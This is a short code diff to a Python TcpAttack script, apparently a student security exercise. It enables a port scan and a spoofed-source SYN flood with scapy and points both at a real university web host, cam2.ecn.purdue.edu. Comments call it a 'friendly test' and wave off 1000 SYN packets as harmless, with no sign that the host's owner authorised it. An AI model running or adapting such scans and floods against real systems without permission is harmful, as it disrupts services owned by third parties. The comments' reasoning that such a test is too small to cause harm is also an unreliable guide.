@@ -28,7 +28,8 @@ class TcpAttack:
                 # connect succeed, so port is open
                 #print("Open Port: {0}". format(port))
                 f.write("Port: {}\n".format(port))
-
+            #else:
+            #    print("Closed Port: {0}". format(port))
             s.close()
 
         f.close()
@@ -48,13 +49,20 @@ class TcpAttack:
                 send(IP(src=self.spoofIP, dst=self.targetIP)/TCP(sport=RandShort(), dport=port, flags="S"))
             return 1
         else:
+            print("The port is not opened!")
             return 0
 
 if __name__ == "__main__":
 
-    tcp = TcpAttack('localhost', 'sopa.ecn.purdue.edu')
+    # spoofIP is locakhost; targetIP is a purdue cam2 website
+    # please forgive this friendly test
+    # I don't think 1000 SYN packets will cause any problem. 
+    tcp = TcpAttack('localhost', 'cam2.ecn.purdue.edu')
 
-    #tcp.scanTarget(20, 445)
+    # scan ports from 20 to 444
+    tcp.scanTarget(20, 445)
 
+    # attack 80 port
     result = tcp.attackTarget(80)
+
     print(result)
